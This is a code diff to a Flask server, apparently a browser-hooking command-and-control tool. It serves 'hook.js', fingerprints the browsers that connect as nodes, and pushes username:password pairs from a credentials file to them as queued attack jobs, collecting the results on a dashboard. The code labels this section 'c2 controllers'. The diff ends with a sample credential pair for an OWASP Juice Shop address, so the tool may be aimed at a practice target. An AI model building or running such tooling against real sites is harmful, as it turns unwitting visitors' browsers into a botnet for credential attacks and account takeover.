@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template, Response, after_this_request, send_file, abort
+from flask import Flask, request, jsonify, render_template, Response, after_this_request, abort
 from flask_cors import cross_origin
 from cef import app, db, rs
 from cef.models import Node, Attack, Result
@@ -23,7 +23,7 @@ def rebuild_attack(attack_id, payload):
     a['payload'] = payload
     return a
 
-def attack_stream():
+def attacks_stream():
     while True:
         sleep(1)
         attack = rs.brpop('attacks')
@@ -33,6 +33,7 @@ def attack_stream():
 
 def results_stream():
     while True:
+        sleep(1)
         result = rs.brpop('results')
         payload = 'retry: {}\n'.format(3000)
         payload +='data: {}\n\n'.format(result[1])
@@ -40,9 +41,9 @@ def results_stream():
 
 # streaming controllers
 
-@app.route('/stream/attack')
+@app.route('/stream/attacks')
 @cross_origin()
-def stream_attack():
+def stream_attacks():
     fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
     if not Node.get_by_fingerprint(fp):
         node = Node(
@@ -53,7 +54,7 @@ def stream_attack():
         )
         db.session.add(node)
         db.session.commit()
-    return Response(attack_stream(), mimetype='text/event-stream')
+    return Response(attacks_stream(), mimetype='text/event-stream')
 
 @app.route('/stream/results')
 def stream_results():
@@ -70,9 +71,9 @@ def js_file(filename):
         return response
     return render_template('hook.js')
 
-@app.route('/report/result', methods=['POST'])
+@app.route('/api/results', methods=['POST'])
 @cross_origin()
-def report_result():
+def create_result():
     jsonobj = json.loads(request.data)
     attack = Attack.query.get(jsonobj.get('id') or -1)
     resp = jsonobj.get('result')
@@ -106,28 +107,42 @@ def report_result():
     else:
         # can't re-queue the payload without a valid attack id
         abort(400)
-    return 'received'
+    return '', 201
 
-# c2 controllers
+# dashboard controllers
 
 @app.route('/dashboard')
 def dashboard():
-    return send_file('dashboard.html')
+    return render_template('dashboard.html')
 
-@app.route('/queue')
-def queue():
-    attack_id = 1
+# attack_id must be a string in order to create url dynamically in js
+@app.route('/attack/<string:attack_id>')
+def run_attack(attack_id):
     with open(app.config['CREDS_PATH']) as fp:
         for line in fp:
             u, p = line.strip().split(':')
             a = build_attack(attack_id, u, p)
             rs.lpush('attacks', json.dumps(a))
-    return 'done'
+    return '', 204
 
-@app.route('/results')
-def results():
+@app.route('/api/status')
+def get_status():
+    length = rs.llen('attacks')
+    message = 'attacking...' if length else 'idle'
+    return jsonify(status={'message': message, 'length': length}), 200
+
+@app.route('/api/results')
+def get_results():
     results = [r.serialize() for r in Result.query.all()]
-    return jsonify(results=results)
+    return jsonify(results=results), 200
+
+@app.route('/api/attacks')
+def get_attacks():
+    attacks = [a.serialize() for a in Attack.query.all()]
+    return jsonify(attacks=attacks), 200
+
+
+
 
 '''
 admin@juice-sh.op:admin123
